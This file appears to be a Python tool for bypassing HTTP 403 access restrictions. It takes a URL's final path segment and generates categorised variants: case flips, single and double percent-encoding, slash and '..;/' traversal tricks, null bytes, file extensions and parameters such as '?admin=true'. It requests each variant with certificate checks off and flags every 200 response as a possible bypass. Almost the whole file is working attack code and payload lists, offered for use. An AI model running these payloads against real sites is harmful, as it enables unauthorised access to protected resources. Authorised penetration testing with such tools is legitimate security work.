#!/usr/bin/env python3
import itertools
import argparse
import random
import urllib3
import requests
import time
from urllib.parse import urlsplit, urlunsplit
from collections import OrderedDict

# optional Windows ANSI support
try:
    import colorama
    colorama.just_fix_windows_console()
except Exception:
    pass

# ANSI color constants
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def random_string(length=5):
    import string, random
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


def split_url(url: str):
    p = urlsplit(url)
    return p.scheme, p.netloc, p.path, p.query, p.fragment


def join_url(scheme, netloc, path, query="", fragment=""):
    if path and not path.startswith("/"):
        path = "/" + path
    return urlunsplit((scheme, netloc, path, query, fragment))


def normalize_parent_and_segment(path: str):
    if not path or path == "/":
        return "", ""
    clean = path.rstrip("/")
    parts = [p for p in clean.split("/") if p]
    seg = parts[-1] if parts else ""
    parent_parts = parts[:-1]
    parent = "/" + "/".join(parent_parts) if parent_parts else ""
    return parent, seg

def case_combinations(endpoint):
    combos = set()
    for combo in itertools.product(*[(c.lower(), c.upper()) for c in endpoint]):
        combos.add("/" + "".join(combo))
    return sorted(combos)

def char_encoding_variants(endpoint: str):
    """Generate character encoding variations like /%61dmin /a%64min /ad%6Din etc. with upper/lower hex."""
    variants = set()

    # two hex maps: lowercase (%61) and uppercase (%41)
    hex_maps = [
        {c: f"%{ord(c):02x}" for c in set(endpoint)},  # lowercase hex
        {c: f"%{ord(c):02X}" for c in set(endpoint)},  # uppercase hex
    ]

    for hex_map in hex_maps:
        # encode one character at a time
        for i in range(len(endpoint)):
            encoded = endpoint[:i] + hex_map.get(endpoint[i], endpoint[i]) + endpoint[i+1:]
            variants.add("/" + encoded)

        # encode two characters
        for i in range(len(endpoint)):
            for j in range(i+1, len(endpoint)):
                encoded = (
                    endpoint[:i]
                    + hex_map.get(endpoint[i], endpoint[i])
                    + endpoint[i+1:j]
                    + hex_map.get(endpoint[j], endpoint[j])
                    + endpoint[j+1:]
                )
                variants.add("/" + encoded)

        # fully encoded
        fully_encoded = "".join(hex_map.get(c, c) for c in endpoint)
        variants.add("/" + fully_encoded)

    return sorted(variants)



def categorized_payloads(endpoint):
    res = OrderedDict()

    res["Case Sensitivity"] = [
        f"/{endpoint.lower()}",
        f"/{endpoint.upper()}",
        f"/{endpoint.capitalize()}",
        f"/{''.join([c.upper() if i % 2 else c.lower() for i, c in enumerate(endpoint)])}",
        f"/{''.join([c.upper() if i % 2 else c.lower() for i, c in enumerate(endpoint)])}",
] + case_combinations(endpoint)

    res["Character Encoding"] = char_encoding_variants(endpoint)

    res["Slash Tricks"] = [
        f"/{endpoint}/",
        f"/{endpoint}%2F",
        f"//{endpoint}",
        f"/./{endpoint}",
        f"/{endpoint}//",
        f"/{endpoint}/.",
        f"/{endpoint}../",
        f"/{endpoint}\\",              # backslash
        f"//..//..//..//{endpoint}",
        f"/{endpoint}%2f/",
        f"/{endpoint}//..//",
        f"/../{endpoint}%2f/",
        f"/../{endpoint}/",
        f"/./../{endpoint}/",
        f"/{endpoint}/..;/",
        f"/{endpoint}..%2f",
        f"/{endpoint}..;/",
]

    res["Encoding"] = [
        f"/{endpoint}%2f",
        f"/{endpoint}%2F/",
        f"/%2e/{endpoint}",
        f"/%2e%2e/{endpoint}",
        f"/{endpoint}%20",
        f"/{endpoint}%09",
        f"/{endpoint}%23",
        f"/{endpoint}%3f",
        f"/{endpoint}%3b/",
        f"/%2f{endpoint}",
]

    res["Double Encoding"] = [
    f"/%252e/{endpoint}",
    f"/%252e%252e/{endpoint}",
    f"/{endpoint}%252f",
    f"/%252f{endpoint}%252f",
    f"..%252F{endpoint}/",
    f"..%25252F{endpoint}/",
    f"..%2F..%2F..%2F..%2F{endpoint}%2f/",
    f"..%2F..%2F..%2F{endpoint}%2f/",
    f"..%2F{endpoint}/",
    f"..%252F{endpoint}/",
    f"/{endpoint}%2F%2F",
    f"..%2F%2F..%2F%2F..%2F%2F{endpoint}",
    f"..%252F%252F..%252F%252F{endpoint}",
    f"..%252F..%252F{endpoint}/",
    f"..%252F..%252F..%252F{endpoint}/",
    f"..%25252F{endpoint}/",
    f"..%25252F..%25252F{endpoint}/",
]

    res["Dot & Semicolon"] = [
    f"/{endpoint}.;/",
    f"/{endpoint};/",
    f"/{endpoint}..;/test",
    f"/{endpoint}.../",
    f"/{endpoint};.json",
    f"/{endpoint};.php",
]

    res["Question Mark Tricks"] = [
    f"/{endpoint}?",
    f"/{endpoint}??/",
    f"/{endpoint}?/../",
    f"/{endpoint}?foo=bar",
    f"/{endpoint}?={random_string()}",
    f"/{endpoint}?redirect=https://google.com",
]

    res["File Extension Tricks"] = [
    f"/{endpoint}.json",
    f"/{endpoint}.php",
    f"/{endpoint}.asp",
    f"/{endpoint}.aspx",
    f"/{endpoint}.html",
    f"/{endpoint}.css",
    f"/{endpoint}.js",
    f"/{endpoint}.txt",
    f"/{endpoint}.xml",
    f"/{endpoint}.jpg",
]

    res["Mixed Extensions"] = [
    f"/{endpoint}.php/",
    f"/{endpoint}.json/",
    f"/{endpoint}.html/anything",
    f"/{endpoint}.css;/",
    f"/{endpoint}.js;param",
    f"/{endpoint}.asp;/",
]

    res["Add Random Parameters"] = [
    f"/{endpoint}?rand={random.randint(100,999)}",
    f"/{endpoint}?x={random_string()}",
    f"/{endpoint}?admin=true",
    f"/{endpoint}?debug=1",
    f"/{endpoint}?foo=1",
    f"/{endpoint}?auth bypass",
]

    res["Special Chars"] = [
    f"/{endpoint}#",
    f"/{endpoint}%00",
    f"/./{endpoint}%09",
    f"/./{endpoint}%23",
    f"/{endpoint}%0d%0a",
    f"/{endpoint}%c0%af",
    f"/{endpoint}%e5%97%bf",
    f"/{endpoint}%uff0e",
]

    encoded_endpoint = (
    endpoint.replace("e", "%65").replace("o", "%6f").replace("a", "%61")
)
    res["Encoded Substitutions"] = [
    f"/{encoded_endpoint}",
    f"/en%64point",
    f"/end%70oint",
    f"/%65ndpoint",
]

    return res


def do_get(url, timeout):
    """Do a GET without following redirects (so 3xx are visible)."""
    try:
        r = requests.get(url, verify=False, timeout=timeout, allow_redirects=False)
        # len of response body if present (may be 0 for 301/302 without body)
        length = len(r.text) if r.text is not None else 0
        return r.status_code, length, r.headers
    except requests.RequestException as e:
        return None, None, {"__error__": str(e)}


def fmt_line(code, short_path, length, suffix=""):
    """Only consider status 200 as POSSIBLE BYPASS. Show redirect target for 3xx."""
    if code is None:
        return f"{RED}[ERR]{RESET} {short_path} ({YELLOW}{suffix}{RESET})" if suffix else f"{RED}[ERR]{RESET} {short_path}"

    if code == 200:
        poss = f"  {YELLOW}<< POSSIBLE BYPASS{RESET}"
        return f"{GREEN}[{code}]{RESET} {short_path} → (Length: {length}){poss}"
    if 300 <= code < 400:
        # Redirect (show Location if available)
        return f"{YELLOW}[{code}]{RESET} {short_path} → (Length: {length}) {YELLOW}{suffix}{RESET}"
    # everything else: keep red (403/404/etc) — NOT a bypass
    return f"{RED}[{code}]{RESET} {short_path} → (Length: {length})"


def run(url: str, delay: float, timeout: float):
    scheme, netloc, path, query, fragment = split_url(url)
    parent, seg = normalize_parent_and_segment(path)

    print(f"{CYAN}{BOLD}[*] Target:{RESET} {url}\n")

    # Baseline
    baseline_url = join_url(scheme, netloc, parent + f"/{seg}", query, fragment) if seg else url
    baseline_code, baseline_len, _ = do_get(baseline_url, timeout)
    baseline_code = baseline_code if baseline_code is not None else 0
    print(f"[BASELINE] {parent + '/' + seg if seg else path} → {baseline_code} (Length: {baseline_len if baseline_len is not None else '-'})\n")

    # Build categories
    urls_by_cat = OrderedDict()
    if seg:
        for cat, plist in categorized_payloads(seg).items():
            urls_by_cat[cat] = [join_url(scheme, netloc, parent + p) for p in plist]

    # De-dup while keeping order
    for cat in urls_by_cat:
        seen = set()
        deduped = []
        for u in urls_by_cat[cat]:
            if u not in seen:
                seen.add(u)
                deduped.append(u)
        urls_by_cat[cat] = deduped

    # Execute
    for cat, url_list in urls_by_cat.items():
        print(f"\n--- {cat} ---")
        for u in url_list:
            code, length, headers = do_get(u, timeout)
            # gather short path (remove scheme+netloc for readability)
            short = u.replace(f"{scheme}://{netloc}", "")
            suffix = ""
            # show redirect location if present
            if headers and isinstance(headers, dict):
                location = headers.get("Location") or headers.get("location")
                if location:
                    suffix = f"Redirect: {location}"
                if "__error__" in headers:
                    suffix = headers["__error__"]

            print(fmt_line(code, short, length, suffix))

            if delay and delay > 0:
                time.sleep(delay)


